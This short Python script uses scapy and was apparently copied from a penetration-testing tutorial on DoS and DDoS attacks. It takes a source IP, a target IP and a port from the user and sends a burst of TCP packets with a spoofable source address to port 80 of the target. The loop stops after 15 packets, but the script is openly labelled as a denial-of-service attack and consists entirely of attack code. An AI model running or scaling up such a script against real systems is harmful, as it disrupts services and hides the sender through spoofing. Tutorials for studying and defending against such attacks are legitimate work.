#code grabbed from https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_dos_and_ddos_attack.htm
from scapy.all import *
def runSingleDoS():
    src = input("Enter the Source IP ")
    target = input("Enter the Target IP ")
    srcport = int(input("Enter the Source Port "))
    i = 1
    while True:
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcport, dport=80)
        pkt = IP1 / TCP1
        send(pkt, inter=.001)
        print("packet sent ", i)
        i = i + 1
        if i == 16:
            break
